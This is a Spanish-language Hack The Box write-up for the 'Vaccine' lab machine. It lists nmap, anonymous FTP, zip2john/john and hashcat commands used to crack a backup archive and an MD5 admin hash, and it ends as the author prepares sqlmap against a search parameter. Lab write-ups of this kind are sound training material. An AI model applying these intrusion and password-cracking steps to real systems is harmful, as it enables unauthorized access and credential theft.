@@ -1,0 +1,35 @@
+HACK THE BOX - VACCINE MACHINE
+
+- sudo nmap -sV -sC -sS 10.129.94.11                                                                                                        -Nmap para escaneo de puerto, servicios y versiones
+
+            -Encontramos 3 puertos abiertos [21 ftp - 22 ssh - 80 http], nos conectamos al puerto 21 ftp, con el usuario "anonymous"
+
+- cd ~\Vaccine\                                                                                                                             -Nos dirigimos a nuestro directorio de trabajo            
+- ftp 10.129.94.11                                                                                                                          -Aprovechamos la vulnerabilidad del puerto y accedemos con el username "anonymous" que no requiere de un password para acceder
+- ls                                                                                                                                        -Listamos los archivos, dond encontramos un comprimido "Backup.zip"
+- get backup.zip                                                                                                                            -Descargamos el archivo zip a nuestro directorio de trabajo.
+- exit                                                                                                                                      -Salimos de la sesion FTP.
+- unzip backup.zip                                                                                                                          -Intentamos descomprimir el archivo, pero este necesita de credenciales para su descompresión, por lo tanto intentaremos hacerlo mediante le herramienta zip2john
+- zip2john backup.zip > backup_z2j                                                                                                          -Con el comando zip2john extrae información del archivo zip que le entreguemos y lo guarda en un archivo de salida, el cual será utilizado por la herramienta john the ripper proximamente para analizar y descifrar posibles contraseñas asociadas al archivo ZIP.
+- john -w=/usr/share/wordlists/rockyou.txt backup_z2j                                                                                       -Le entregamos el archivo generado por zip2john a la herramienta john para descifrar alguna posible password.
+- john --show backup_z2j                                                                                                                    -Comando nos muestra las posibles contraseñas encontradas con el anterior comando, de donde encontramos que la password es: 741852963
+- unzip backup.zip                                                                                                                          -Descomprimimos el archivo y colocamos la password crackeada
+  
+            -Una vez descomprimido el archivo encontramos 2 archivos [index.php - style.css], el segundo unicamente contiene parametrós de estilo de la página, asi que nos vamos a investigar un poco la información dentro de index.php
+
+-cat index.php
+
+            -Encontramos una credencial para el inicio de sesión: if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") 
+            -tenemos un username: admin y un password: 2cb42f8734ea607eefed3b70af13bbd3, que como se ve en la linea anterior, se encuentra cifrada "md5($_POST['password'])" en MD5, por lo tanto procederemos a crackearla mediante el uso de la herramienta hashcat.
+
+- echo "2cb42f8734ea607eefed3b70af13bbd3" > index_pass            
+- hashcat --help                                                                                                                            -Encontramos basic examples de como ingresar y hacer uso del comando.
+- hashcat --help | grep -i md5                                                                                                              -Para el uso de hashcat debemos ingresar el tipo de decifrado que se utilizará, para esto lo filtramos y buscamos, de donde encontramos que MD5 es 0
+- hashcat -m 0 index_pass -w=/usr/share/wordlists/rockyou.txt -o index_cracked --show                                                       -Ejecutamos la herramienta y nos dará la pass descifrada en el archivo index_cracked, de donde encontramos que la pass descifrada es: qwerty789
+
+            -Como en un principio vimos que existian 3 puertos abierto dentro de los cuales uno era el puerto 80 con servidor Apache corriendo con Ubuntu, nos conectamos a la web mediante firefox http://10.129.94.11
+            -En donde encontramos una web con credeciales para ingresar, probamos las convencionales, y posterior probamos lo encontrado anteriormente [admin:qwerty789], y nos damos cuenta que podemos ingresar a un tipo de base de datos, ademas podemos ver que la pagina se encuentra hecha en PHP
+            -Explorando verificamos que existe una posible vulnerabilidad mediante SQL Injection en el parámetro "Search" en la URL, para ello utilizaremos un metodo de SQL injection automatizado llamado sqlmap.
+
+ 
+
